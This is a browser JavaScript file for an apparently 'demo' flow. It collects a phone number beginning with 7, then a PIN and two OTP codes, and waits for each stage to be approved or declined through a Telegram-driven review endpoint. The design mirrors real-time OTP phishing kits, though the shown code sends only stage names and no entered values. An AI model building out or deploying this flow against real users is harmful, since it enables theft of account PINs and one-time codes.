"use strict";

let currentRef = null;
let currentStage = null;
let pollTimer = null;
let reviewInProgress = false;

const stageOrder = {
  pin_demo: "otp1Page",
  otp1_demo: "otp2Page",
  otp2_demo: "successPage"
};

function show(id) {
  document.querySelectorAll(".page").forEach(page => {
    page.classList.remove("active");
  });

  const page = document.getElementById(id);

  if (page) {
    page.classList.add("active");
  }
}

function stopTimers() {
  if (pollTimer) {
    clearInterval(pollTimer);
    pollTimer = null;
  }
}

async function requestReview(stage) {
  const status = document.getElementById("reviewStatus");

  try {
    if (status) {
      status.textContent = "Requesting demo review…";
    }

    const response = await fetch("/api/demo-status", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ stage })
    });

    const data = await response.json();

    if (!response.ok || !data.success || !data.reference) {
      throw new Error(data.error || "Unable to create demo review.");
    }

    currentRef = data.reference;
    currentStage = stage;

    if (status) {
      status.textContent =
        `Reference: ${currentRef}. Waiting for a Telegram decision…`;
    }

    watchReview(currentRef, currentStage);
  } catch (error) {
    reviewInProgress = false;

    if (status) {
      status.textContent =
        "Unable to contact the server. Please try again.";
    }

    console.error("Demo review error:", error);
  }
}

function watchReview(reference, stage) {
  stopTimers();

  pollTimer = setInterval(async () => {
    try {
      const response = await fetch(
        `/api/demo-status/${encodeURIComponent(reference)}`
      );

      if (!response.ok) return;

      const data = await response.json();

      if (currentRef !== reference || currentStage !== stage) {
        return;
      }

      if (data.status === "approved") {
        stopTimers();
        reviewInProgress = false;

        const nextPage = stageOrder[stage];

        currentRef = null;
        currentStage = null;

        if (nextPage) {
          show(nextPage);
        } else {
          show("successPage");
        }
      } else if (data.status === "declined") {
        stopTimers();
        reviewInProgress = false;

        currentRef = null;
        currentStage = null;

        show("declinePage");
      }
    } catch (error) {
      console.error("Review status check failed:", error);
    }
  }, 2000);
}

function startWait(stage) {
  if (reviewInProgress) return;

  reviewInProgress = true;

  stopTimers();
  currentRef = null;
  currentStage = null;

  show("loadingPage");

  const status = document.getElementById("reviewStatus");
  const seconds = document.getElementById("seconds");

  if (status) {
    status.textContent = "Requesting demo review…";
  }

  if (seconds) {
    seconds.textContent = "Waiting for review…";
  }

  requestReview(stage);
}

function resetDemo() {
  stopTimers();

  currentRef = null;
  currentStage = null;
  reviewInProgress = false;

  const number = document.getElementById("demoNumber");

  if (number) {
    number.value = "";
  }

  show("homePage");
}

document.getElementById("startBtn").addEventListener("click", () => {
  show("numberPage");
});

document.getElementById("numberBtn").addEventListener("click", () => {
  const input = document.getElementById("demoNumber");
  const number = input.value.replace(/\D/g, "");

  input.value = number;

  if (!/^7\d{8}$/.test(number)) {
    alert("Enter a fictional nine-digit demo number beginning with 7.");
    input.focus();
    return;
  }

  show("pinPage");
});

document.getElementById("pinBtn").addEventListener("click", () => {
  startWait("pin_demo");
});

document.getElementById("otp1Btn").addEventListener("click", () => {
  startWait("otp1_demo");
});

document.getElementById("otp2Btn").addEventListener("click", () => {
  startWait("otp2_demo");
});

document.getElementById("restartSuccess").addEventListener("click", resetDemo);

document.getElementById("restartDecline").addEventListener("click", resetDemo);

document.querySelectorAll("[data-back]").forEach(button => {
  button.addEventListener("click", () => {
    if (!reviewInProgress) {
      show(button.dataset.back);
    }
  });
});
